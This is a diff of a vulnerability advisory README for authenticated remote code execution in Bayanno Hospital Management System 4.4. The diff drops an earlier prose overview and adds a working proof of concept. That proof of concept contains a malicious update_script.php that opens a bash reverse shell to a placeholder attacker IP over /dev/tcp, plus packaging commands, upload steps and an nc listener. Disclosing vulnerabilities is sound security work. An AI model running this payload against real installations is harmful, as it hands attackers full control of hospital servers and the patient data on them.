@@ -1,68 +1,70 @@
-# CVE – Authenticated Remote Code Execution in Bayanno Hospital Management System
+# Authenticated Remote Code Execution in Bayanno Hospital Management System 4.4 (Creativeitem)
 
-## Overview
+## Summary
 
-This repository documents a security vulnerability identified in **Bayanno Hospital Management System**, developed by **Creativeitem**.  
-The issue resides in the application's update mechanism and allows **authenticated remote code execution (RCE)** under specific conditions.
-
-The purpose of this repository is **security research, responsible disclosure, and defensive awareness**.
+An **authenticated remote code execution (RCE)** vulnerability exists in the update mechanism of [Bayanno Hospital Management System 4.4](https://creativeitem.com/product/bayanno-hospital-management-system/) by Creativeitem. The updater controller allows an authenticated administrator to upload a ZIP archive containing arbitrary PHP code, which is later executed server-side without validation, integrity checks, or sandboxing. This enables a malicious admin to achieve full compromise of the web application and underlying server.
 
 ---
 
-## Affected Product
+## Vulnerability Details
 
-- **Product:** Bayanno Hospital Management System  
-- **Vendor:** Creativeitem  
-- **Component:** Update mechanism (`Updater` controller)  
-- **Affected Versions:** All versions prior to a vendor-provided fix  
+- **Affected Component:** `/admin/update` (Update Mechanism)
+- **Vulnerability Type:** Authenticated Remote Code Execution (RCE)
+- **Authentication Required:** Yes (Administrator)
+- **Impact:** Complete compromise of the application and server
 
----
+### Technical Description
 
-## Vulnerability Summary
-
-An authenticated administrator can upload a crafted update package that is extracted and processed by the system without proper validation or sandboxing.  
-During the update process, a PHP script contained in the uploaded package is executed directly by the application.
-
-This behavior enables **arbitrary PHP code execution**, resulting in full compromise of the application and potentially the underlying server.
+The update feature allows an admin user to upload a ZIP file containing an update package. The server extracts the archive and executes `update_script.php` found within it, with no validation or sanitization. Attackers can craft a ZIP with a malicious `update_script.php`, gaining code execution with the web server's privileges.
 
 ---
 
-## Technical Details
+## Proof of Concept (PoC)
 
-The vulnerability is caused by the following design flaws:
+### 1. Prepare Malicious ZIP
 
-- Execution of uploaded PHP files via `require` without validation
-- Absence of integrity or signature verification for update packages
-- No sanitization of ZIP archive contents (Zip Slip risk)
-- Arbitrary file write via uncontrolled `copy()` operations
-- Update directory located within the web root
-- Lack of restrictive allowlists for file destinations
+Directory structure:
 
----
+```
+update/
+└── update_v2.3/
+├── update_config.json
+├── update_script.php
+```
 
-## Attack Scenario
+#### `update_config.json` 
+```
+json { "directory": [], "files": [] }
+```
 
-1. An attacker gains administrative access (legitimate account or compromised credentials).
-2. The attacker uploads a crafted ZIP file through the update interface.
-3. The ZIP archive is extracted server-side.
-4. A PHP script inside the archive is executed automatically.
-5. Arbitrary PHP code execution is achieved.
+#### `update_script.php` 
+```
+<?php
+// Reverse shell example (change IP and port)
+exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
+?>
+```
 
-No additional user interaction is required.
+### 2. Zip the Payload
 
----
+```
+zip -r update_v2.3.zip update/
+```
 
-## Impact
+### 3. Upload the Malicious ZIP
 
-- Arbitrary PHP code execution
-- Arbitrary file creation or overwrite
-- Full compromise of the application
-- Potential server-level compromise
-- Possible lateral movement within the hosting environment
+1-Login as administrator.
+2-Go to the Update section (/admin/update).
+3-Upload the update_v2.3.zip file.
+4-Trigger the update process.
 
----
+![0b6fbb74-e30e-4dd5-83a2-23bc119e9040](https://github.com/user-attachments/assets/814d7415-60c1-47cb-b176-451468b603bb)
 
-## Severity
+### 4. Get a Shell
 
-**CVSS v3.1 Base Score:** 8.8 (High)
+```
+nc -lvnp 4444
+```
+<img width="598" height="70" alt="image" src="https://github.com/user-attachments/assets/c612232a-fdf6-4cb3-b8b8-47a5fc28c77c" />
+
 
